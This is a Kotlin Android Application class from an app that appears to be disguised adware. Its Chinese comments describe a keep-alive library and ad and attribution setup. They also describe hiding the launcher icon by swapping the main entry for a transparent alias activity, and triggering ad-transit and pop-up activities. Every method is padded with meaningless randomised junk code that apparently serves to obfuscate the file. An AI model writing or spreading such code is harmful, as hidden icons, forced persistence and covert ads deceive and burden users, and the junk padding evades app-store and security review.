package msbp.gzry.jqhe

import android.app.Application
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat.startActivity
import com.b.w.BaseJksApplication
import msbp.gzry.jqhe.tools.ToolUiInstaller
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import msbp.mig.dplzh.base.APPContext
import msbp.mig.dplzh.base.BaseApplication
import msbp.mig.dplzh.base.OverseaAppHost
import msbp.mig.dplzh.base.OverseaAppInitializer


class OXP : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: OXP? = null
    }

    override fun onCreate() {
        val arr_kDTkYWsIkfuSpjWQGla = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_NCccGk  = (arr_kDTkYWsIkfuSpjWQGla  shl 95) xor (arr_kDTkYWsIkfuSpjWQGla  shr 56)
         val j_JTANNrwyAHDyQHWKNy  = i_NCccGk .inv() and 0xFFFF
         if (j_JTANNrwyAHDyQHWKNy  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_PGVDKxtBPZdcpROPQM")
         }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
        val arr_gAxCmulHkogf = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_mgIQKWmrcgCqJyntli  = (arr_gAxCmulHkogf  shl 95) xor (arr_gAxCmulHkogf  shr 74)
         val j_nRVruKZG  = i_mgIQKWmrcgCqJyntli .inv() and 0xFFFF
         if (j_nRVruKZG  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_OjxedqPFMOQxpZXjN")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_ukNZJop  = listOf("zwpthPJNkBIhupDaIa", "lBTgqRGZkjBsqz", "yTgLXMzTPekAyXqJ").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_MMhyhrxATtsf  = arr_ukNZJop .filter { it.length > 77 }
         if (ad_MMhyhrxATtsf .isNotEmpty() && java.lang.System.currentTimeMillis() < 21) {
             ad_MMhyhrxATtsf .forEach { _ ->  }
         }
        ZIKN.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_QSfUVAzUtJbCfE  = listOf("niwfVRvfFlUHIELYJ", "zTjhlfvHf", "jitrPuVWfgalBsrmoyT").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_nLtqoJlLUrjg  = arr_QSfUVAzUtJbCfE .filter { it.length > 55 }
         if (ad_nLtqoJlLUrjg .isNotEmpty() && java.lang.System.currentTimeMillis() < 81) {
             ad_nLtqoJlLUrjg .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }


    override fun initPopPower() {
        val arr_RuMtOUWuLNyUrgen = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_XSQChfsYcYWLlfTWYqC  = (arr_RuMtOUWuLNyUrgen  shl 25) xor (arr_RuMtOUWuLNyUrgen  shr 68)
         val j_bTIPFrYkuQgLyjPw  = i_XSQChfsYcYWLlfTWYqC .inv() and 0xFFFF
         if (j_bTIPFrYkuQgLyjPw  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_sdGFWBZpQy")
         }
        // 启动图标隐藏：禁用 JWVI 主入口，启用透明 MysteryAliasActivity
        startActivity(Intent(this, ZIIU::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        })
        df.vir(insApp)
    }


    override fun initKeepPower(app: Application) {
        val PIeXDpeRx : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val TLaKRqknrogxDFNA  = PIeXDpeRx ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_47" 
            }
            if (TLaKRqknrogxDFNA .startsWith("XWdsfHFMZGo ")) {
                android.util.Log.v("TAG", TLaKRqknrogxDFNA )
            }
        Helpers.setGuiyin(true)
    }

}